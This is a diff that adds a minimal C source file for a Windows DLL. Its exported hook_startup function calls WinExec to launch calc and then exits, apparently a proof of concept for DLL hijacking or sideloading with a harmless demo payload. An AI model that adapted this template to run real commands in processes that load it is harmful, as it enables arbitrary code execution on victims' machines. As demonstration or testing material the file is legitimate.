@@ -1,0 +1,12 @@
+#include <windows.h>
+#define DllExport __declspec (dllexport)
+
+DllExport void hook_startup() { exp(); }
+
+int exp()
+{
+  WinExec("calc", 0);
+  exit(0);
+  return 0;
+}
+
